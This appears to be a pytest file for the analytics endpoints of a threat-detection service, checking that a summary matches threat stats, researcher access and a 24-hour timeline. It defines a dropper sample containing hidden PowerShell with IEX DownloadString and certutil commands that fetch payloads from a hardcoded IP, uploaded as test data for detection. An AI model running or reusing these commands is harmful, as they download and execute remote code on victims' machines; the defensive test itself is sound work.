"""Analytics dashboard endpoints."""

import io

from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b"
)


def _headers(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def test_analytics_summary_matches_threat_stats():
    analyst = _headers()
    client.post(
        "/api/v1/files/upload",
        files={"file": ("analytics-dropper.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=analyst,
    )

    summary = client.get("/api/v1/analytics/summary", headers=analyst).json()
    stats = client.get("/api/v1/threats/stats", headers=analyst).json()

    assert summary["total_samples"] == stats["total_detections"]
    assert summary["malicious"] + summary["suspicious"] + summary["benign"] == stats[
        "total_detections"
    ]
    assert summary["by_level"] == stats["by_level"]
    assert "generated_at" in summary


def test_analytics_summary_available_to_researcher():
    # Researchers can't see /threats/* but should still see the rollup.
    resp = client.get("/api/v1/analytics/summary", headers=_headers("researcher@local"))
    assert resp.status_code == 200


def test_analytics_timeline_window():
    resp = client.get(
        "/api/v1/analytics/timeline", params={"window": "24h"}, headers=_headers()
    )
    assert resp.status_code == 200
    buckets = resp.json()
    assert len(buckets) == 24